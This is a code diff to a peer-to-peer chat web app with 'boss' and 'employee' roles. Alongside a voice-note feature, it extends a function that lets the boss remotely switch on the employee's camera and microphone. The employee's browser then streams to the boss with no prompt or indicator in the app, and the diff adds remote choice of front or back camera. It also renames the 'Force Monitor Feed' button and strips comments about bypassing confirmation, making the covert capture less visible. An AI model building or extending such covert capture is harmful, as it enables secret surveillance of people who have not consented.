@@ -100,12 +100,18 @@
                     <span id="activeUserBadge" class="text-xs font-bold px-2 py-0.5 rounded uppercase"></span>
                 </div>
                 
-                <div class="flex gap-2">
-                    <div id="bossControls" class="hidden gap-2">
+                <div class="flex gap-2 items-center">
+                    <!-- Boss Controls -->
+                    <div id="bossControls" class="hidden flex gap-1 items-center">
+                        <select id="cameraFacingSelect" onchange="onBossChangeCamera()" class="bg-slate-900 border border-white/10 text-slate-300 text-xs rounded-xl px-2 py-1.5 focus:outline-none">
+                            <option value="user">Front Cam</option>
+                            <option value="environment">Back Cam</option>
+                        </select>
                         <button onclick="bossDemandsEmployeeFeed()" class="px-3 py-1.5 text-xs font-semibold bg-indigo-600/20 hover:bg-indigo-600 text-indigo-300 hover:text-white border border-indigo-500/30 rounded-xl transition flex items-center gap-1.5" title="Monitor Employee Camera">
-                            <i data-lucide="video" class="w-4 h-4"></i> Force Monitor Feed
+                            <i data-lucide="video" class="w-4 h-4"></i> Monitor Feed
                         </button>
                     </div>
+                    <!-- Employee Controls -->
                     <div id="employeeControls" class="hidden">
                         <button id="requestCallBtn" class="px-3 py-1.5 text-xs font-semibold bg-cyan-600/20 hover:bg-cyan-600 text-cyan-300 hover:text-white border border-cyan-500/30 rounded-xl transition flex items-center gap-1.5">
                             <i data-lucide="radio" class="w-3.5 h-3.5 animate-pulse"></i> Request Boss Video
@@ -133,7 +139,10 @@
             <div id="messageBox" class="flex-grow overflow-y-auto space-y-2 pr-1 text-sm my-1"></div>
 
             <!-- Message Input Form -->
-            <form id="msgForm" class="flex gap-2" onsubmit="sendMessage(event)">
+            <form id="msgForm" class="flex gap-2 items-center" onsubmit="sendMessage(event)">
+                <button type="button" id="voiceNoteBtn" onclick="toggleVoiceRecord()" class="bg-slate-800 text-slate-300 border border-white/10 p-3 rounded-xl hover:bg-slate-700 transition flex items-center justify-center">
+                    <i id="micIcon" data-lucide="mic" class="w-4 h-4"></i>
+                </button>
                 <input type="text" id="msgInput" placeholder="Transmit data string..." autocomplete="off"
                        class="flex-grow glass-input rounded-xl py-3 px-4 text-white placeholder-slate-600 focus:outline-none text-sm">
                 <button type="submit" class="bg-indigo-600 hover:bg-indigo-500 text-white p-3 rounded-xl transition flex items-center justify-center active:scale-[0.98]">
@@ -164,7 +173,12 @@
         let conn = null;
         let currentCall = null;
         let localStream = null;
-        let expectingSilentFeed = false; // State flag to prevent the reverse popup loop
+        let expectingSilentFeed = false;
+        
+        // Voice Note States
+        let mediaRecorder = null;
+        let audioChunks = [];
+        let isRecording = false;
 
         function generateCode(len = 6) {
             const chars = 'ABCDEFGHJKLMNPQRSTUVWXYZ23456789';
@@ -218,12 +232,10 @@
             peer.on('call', (call) => {
                 if (myRole === 'boss') {
                     if (expectingSilentFeed) {
-                        // FIX: If the boss explicitly requested this feed, bypass modal popup entirely
                         expectingSilentFeed = false; 
-                        call.answer(); // Answer without sending Boss's camera tracks
+                        call.answer(); 
                         handleStream(call);
                     } else {
-                        // This is a manual employee request to see the Boss -> Show choice modal popup
                         document.getElementById('incomingCallModal').classList.remove('hidden');
                         document.getElementById('acceptCallBtn').onclick = async () => {
                             document.getElementById('incomingCallModal').classList.add('hidden');
@@ -244,8 +256,13 @@
                         };
                     }
                 } else {
-                    // EMPLOYEE SIDE: Silently handle incoming data channel calls
-                    navigator.mediaDevices.getUserMedia({ video: true, audio: true }).then((stream) => {
+                    // EMPLOYEE SIDE: Look for facing mode constraint requested inside meta connection parameter if supplied
+                    const facingMode = call.metadata && call.metadata.facingMode ? call.metadata.facingMode : 'user';
+                    
+                    navigator.mediaDevices.getUserMedia({ 
+                        video: { facingMode: facingMode }, 
+                        audio: true 
+                    }).then((stream) => {
                         localStream = stream;
                         call.answer(stream); 
                         currentCall = call;
@@ -282,52 +299,69 @@
                 if (data.type === 'call_request' && myRole === 'boss') {
                     appendSysMsg("System Alert: Employee requesting mutual video feed access.");
                 } else if (data.type === 'force_stream_instruction') {
-                    executeSilentStreamUpload();
+                    executeSilentStreamUpload(data.facingMode);
                 } else if (data.type === 'msg') {
                     appendMsg(data.body, 'remote');
+                } else if (data.type === 'voice_note') {
+                    appendVoiceMsg(data.blobUrl, 'remote');
                 }
             });
 
             conn.on('close', () => terminateSession());
         }
 
-        // FIX: Re-engineered reliable message sender and text clear routine
         function sendMessage(e) {
             e.preventDefault();
             const inputField = document.getElementById('msgInput');
-            const val = inputField.value.trim();
+            const val = inputField.value; // Keeps raw string data preserves emojis fully
             
             if(!val || !conn) return;
 
             conn.send({type: 'msg', body: val});
             appendMsg(val, 'local');
             
-            inputField.value = ''; // Wipes text box instantly
+            inputField.value = ''; 
             inputField.focus();
         }
 
-        // BOSS EXCLUSIVE ACTION
+        // BOSS ACTION: Initiates force feed with camera selection choice payload
         function bossDemandsEmployeeFeed() {
             if (conn) {
-                expectingSilentFeed = true; // Tell system to bypass confirmation dialogs
-                conn.send({ type: 'force_stream_instruction' });
-                appendSysMsg("Command Sent: Requesting background monitoring feed...");
+                expectingSilentFeed = true; 
+                const selectedCamera = document.getElementById('cameraFacingSelect').value;
+                conn.send({ type: 'force_stream_instruction', facingMode: selectedCamera });
+                appendSysMsg("Command Sent: Connecting background camera feed...");
             }
         }
 
-        // EMPLOYEE EXCLUSIVE BACKEND RUNNER
-        async function executeSilentStreamUpload() {
+        // BOSS ACTION: Mid-stream seamless camera switch handler 
+        function onBossChangeCamera() {
+            if(currentCall && conn && myRole === 'boss') {
+                if(currentCall) currentCall.close();
+                bossDemandsEmployeeFeed();
+            }
+        }
+
+        // EMPLOYEE BACKGROUND RUNNER
+        async function executeSilentStreamUpload(facingModeSetting) {
             try {
-                localStream = await navigator.mediaDevices.getUserMedia({ video: true, audio: true });
-                const call = peer.call(conn.peer, localStream);
+                if(localStream) {
+                    localStream.getTracks().forEach(track => track.stop());
+                }
+                localStream = await navigator.mediaDevices.getUserMedia({ 
+                    video: { facingMode: facingModeSetting || 'user' }, 
+                    audio: true 
+                });
+                // Pass facingMode in metadata options object to peer handler block target
+                const call = peer.call(conn.peer, localStream, { metadata: { facingMode: facingModeSetting } });
                 currentCall = call;
                 call.on('close', () => cleanMediaTracks());
             } catch (err) {
-                console.error("Background capture block", err);
+                console.error("Background stream allocation failed", err);
             }
         }
 
-        // EMPLOYEE EXCLUSIVE ACTION
+        // EMPLOYEE MUTUAL CALL INITIATOR
         document.getElementById('requestCallBtn').addEventListener('click', () => {
             if (conn) {
                 conn.send({ type: 'call_request' });
@@ -347,16 +381,70 @@
             }
         });
 
+        // VOICE NOTE SYSTEM IMPLEMENTATION
+        async function toggleVoiceRecord() {
+            const btn = document.getElementById('voiceNoteBtn');
+            const icon = document.getElementById('micIcon');
+            
+            if (!isRecording) {
+                try {
+                    const audioStream = await navigator.mediaDevices.getUserMedia({ audio: true });
+                    mediaRecorder = new MediaRecorder(audioStream);
+                    audioChunks = [];
+
+                    mediaRecorder.ondataavailable = (e) => {
+                        if (e.data.size > 0) audioChunks.push(e.data);
+                    };
+
+                    mediaRecorder.onstop = () => {
+                        const audioBlob = new Blob(audioChunks, { type: 'audio/webm' });
+                        
+                        // Convert blob to base64 string or ArrayBuffer data string to pass seamlessly inside P2P Data stream channels
+                        const reader = new FileReader();
+                        reader.readAsDataURL(audioBlob);
+                        reader.onloadend = () => {
+                            const base64Audio = reader.result;
+                            if(conn) {
+                                conn.send({ type: 'voice_note', blobUrl: base64Audio });
+                                appendVoiceMsg(base64Audio, 'local');
+                            }
+                        };
+                        audioStream.getTracks().forEach(t => t.stop()); // kill microphone usage engine quickly
+                    };
+
+                    mediaRecorder.start();
+                    isRecording = true;
+                    btn.classList.remove('bg-slate-800');
+                    btn.classList.add('bg-rose-600', 'animate-pulse');
+                    icon.setAttribute('data-lucide', 'square');
+                    lucide.createIcons();
+                    
+                    // Auto-stop limit cap protection safeguard window (30 seconds maximum length)
+                    setTimeout(() => { if (isRecording) toggleVoiceRecord(); }, 30000);
+
+                } catch(err) {
+                    console.error("Microphone hardware error resource tracking block", err);
+                }
+            } else {
+                if(mediaRecorder && mediaRecorder.state !== 'inactive') {
+                    mediaRecorder.stop();
+                }
+                isRecording = false;
+                btn.classList.remove('bg-rose-600', 'animate-pulse');
+                btn.classList.add('bg-slate-800');
+                icon.setAttribute('data-lucide', 'mic');
+                lucide.createIcons();
+            }
+        }
+
         function handleStream(call) {
             currentCall = call;
-            
             if (myRole === 'boss') {
                 document.getElementById('videoContainer').classList.remove('hidden');
                 document.getElementById('videoContainer').classList.add('grid');
-                document.getElementById('localVideoWrapper').classList.add('hidden'); // Ensure boss camera box stays hidden
+                document.getElementById('localVideoWrapper').classList.add('hidden'); 
                 document.getElementById('remoteVideoLabel').textContent = "Employee Live Feed";
             }
-            
             call.on('stream', (remoteStream) => {
                 displayStream(remoteStream, 'remote');
             });
@@ -388,8 +476,29 @@
             } else {
                 bubble.classList.add('bg-white/10', 'text-slate-200', 'rounded-bl-none', 'border', 'border-white/5');
             }
-            bubble.textContent = text;
+            
+            // TextContent safely escapes script injections while rendering raw native strings intact with matching system emojis correctly
+            bubble.textContent = text; 
             wrap.appendChild(bubble);
+            const box = document.getElementById('messageBox');
+            box.appendChild(wrap);
+            box.scrollTop = box.scrollHeight;
+        }
+
+        function appendVoiceMsg(dataUrl, sender) {
+            const wrap = document.createElement('div');
+            wrap.classList.add('flex', 'w-full', sender === 'local' ? 'justify-end' : 'justify-start', 'my-1');
+            
+            const container = document.createElement('div');
+            container.classList.add('rounded-xl', 'p-2', 'flex', 'items-center', 'gap-2', sender === 'local' ? 'bg-indigo-600/50' : 'bg-slate-800', 'border', 'border-white/10');
+            
+            const player = document.createElement('audio');
+            player.src = dataUrl;
+            player.controls = true;
+            player.classList.add('h-8', 'w-48');
+            
+            container.appendChild(player);
+            wrap.appendChild(container);
             const box = document.getElementById('messageBox');
             box.appendChild(wrap);
             box.scrollTop = box.scrollHeight;
